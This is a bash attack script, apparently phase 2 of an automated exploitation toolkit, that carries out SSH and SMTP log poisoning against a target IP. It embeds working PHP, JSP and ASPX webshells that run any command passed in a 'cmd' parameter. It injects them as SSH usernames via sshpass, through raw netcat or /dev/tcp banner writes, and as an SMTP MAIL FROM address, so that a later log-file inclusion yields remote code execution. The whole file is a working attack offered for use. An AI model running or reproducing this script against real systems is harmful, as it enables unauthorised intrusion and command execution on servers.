#!/bin/bash
# SSH Payload Delivery -- Phase 2: inject webshell payload into SSH auth.log
# 用法: deliver_ssh.sh <ENDPOINT> <TARGET_IP>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"
TARGET_IP="${2:-127.0.0.1}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== SSH Log Poison: Payload Delivery (Phase 2) ==="

SSH_PORT="${ssh_port:-22}"
if [ -z "$SSH_PORT" ] || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
  SSH_PORT=22
fi

LANG="${webshell_lang:-php}"

case "$LANG" in
  php)  PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
  jsp)  PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>' ;;
  aspx) PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>' ;;
  *)    PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
esac
echo "[INFO] lang=$LANG payload_len=${#PAYLOAD}"

SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
  -p "$SSH_PORT" "${PAYLOAD}"@"$TARGET_IP" 2>&1 || true)
echo "$SSH_ERR" | head -2
if echo "$SSH_ERR" | grep -qi "invalid characters"; then
  echo "[INFO] SSH rejected special chars, falling back to nc banner injection"
  if command -v nc >/dev/null 2>&1; then
    printf '%s\r\n' "$PAYLOAD" | nc -w 2 "$TARGET_IP" "$SSH_PORT" >/dev/null 2>&1 || true
  else
    (exec 3<>/dev/tcp/"$TARGET_IP"/"$SSH_PORT" && \
     printf '%s\r\n' "$PAYLOAD" >&3 && sleep 1 && \
     exec 3>&- 3<&-) >/dev/null 2>&1 || true
  fi
fi

# Also poison SMTP mail.log if port 25 is open
if (exec 3<>/dev/tcp/"$TARGET_IP"/25) 2>/dev/null; then
  exec 3>&- 3<&- 2>/dev/null || true
  echo "[INFO] SMTP port open, also poisoning mail.log"
  (printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$PAYLOAD" | \
    nc -w 3 "$TARGET_IP" 25 >/dev/null 2>&1) || true
fi
sleep 2
echo "PAYLOAD_DELIVERED"
